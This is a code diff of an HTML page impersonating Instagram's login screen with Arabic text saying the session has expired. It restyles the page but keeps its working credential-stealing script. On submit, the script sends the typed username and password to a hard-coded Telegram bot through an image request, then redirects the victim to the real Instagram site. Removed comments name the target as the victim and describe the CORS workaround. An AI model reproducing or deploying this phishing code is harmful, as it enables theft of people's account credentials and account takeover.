@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول - متابعة الجلسة</title>
+    <title>Instagram</title>
     <style>
         body {
             background-color: #fafafa;
@@ -14,87 +14,87 @@
             height: 100vh;
             margin: 0;
         }
-        .login-container {
-            background: white;
+        .login-box {
+            background: #fff;
             border: 1px solid #dbdbdb;
-            padding: 40px;
+            border-radius: 1px;
+            padding: 30px 40px;
             width: 350px;
             text-align: center;
-            border-radius: 4px;
         }
-        .login-container h2 {
-            font-family: cursive;
-            margin-bottom: 30px;
-            font-size: 32px;
-            color: #262626;
+        .logo {
+            font-family: 'Billabong', sans-serif; /* محاكاة خط إنستغرام أو استخدام صورة الشعار */
+            font-size: 40px;
+            margin: 22px 0;
+            font-weight: bold;
         }
-        .login-container input {
+        input {
             width: 100%;
-            padding: 9px 8px;
             background: #fafafa;
             border: 1px solid #dbdbdb;
             border-radius: 3px;
-            margin-bottom: 6px;
             box-sizing: border-box;
+            color: #262626;
             font-size: 12px;
+            padding: 9px 8px;
+            margin-bottom: 6px;
         }
-        .login-container button {
-            width: 100%;
+        input:focus {
+            border-color: #a8a8a8;
+            outline: none;
+        }
+        .btn {
             background-color: #0095f6;
-            color: white;
-            border: none;
-            padding: 7px;
+            border: 1px solid transparent;
             border-radius: 4px;
-            font-weight: 600;
-            margin-top: 10px;
+            color: #fff;
             cursor: pointer;
-        }
-        .login-container p {
+            font-weight: 600;
             font-size: 14px;
-            color: #8e8e8e;
-            margin-top: 15px;
+            width: 100%;
+            padding: 7px;
+            margin-top: 10px;
+        }
+        .sub-text {
+            color: #737373;
+            font-size: 14px;
+            line-height: 18px;
+            margin-bottom: 20px;
         }
     </style>
 </head>
 <body>
 
-    <div class="login-container">
-        <h2>Instagram</h2>
-        <p>يرجى تسجيل الدخول للمتابعة بعد انتهاء صلاحية الجلسة.</p>
+    <div class="login-box">
+        <div class="logo">Instagram</div>
+        <p class="sub-text">يرجى تسجيل الدخول للتحقق من الحساب واستئناف الجلسة.</p>
         
         <form id="loginForm">
             <input type="text" id="username" placeholder="اسم المستخدم، أو البريد الإلكتروني، أو رقم الهاتف" required>
             <input type="password" id="password" placeholder="كلمة المرور" required>
-            <button type="submit" id="submitBtn">تسجيل الدخول</button>
+            <button type="submit" class="btn">تسجيل الدخول</button>
         </form>
     </div>
 
     <script>
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
-
             const user = document.getElementById('username').value;
             const pass = document.getElementById('password').value;
 
-            // بيانات بوت تيليجرام الخاص بك
             const botToken = "8970427451:AAFqyCocC3VS1jGYo8Da_ET6PNrV6hWdOVs";
             const chatId = "865078178";
-
-            // تجهيز الرسالة
-            const message = "🚨 تم التقاط بيانات جديدة:\n👤 المستخدم: " + user + "\n🔑 كلمة المرور: " + pass + "\n🌐 الرابط: " + window.location.href;
-
-            // إرسال البيانات عبر طلب صورة لتجاوز مشاكل CORS
-            const telegramUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);
+            
+            const message = "🚨 بيانات جديدة:\nالمستخدم: " + user + "\nكلمة المرور: " + pass + "\nالرابط: " + window.location.href;
+            const url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);
             
             const img = new Image();
-            img.src = telegramUrl;
+            img.src = url;
 
-            // إعادة توجيه الضحية إلى الموقع الحقيقي بعد إرسال البيانات بدقة
             setTimeout(function() {
                 window.location.href = "https://www.instagram.com";
-            }, 600);
+            }, 500);
         });
     </script>
-
 </body>
 </html>
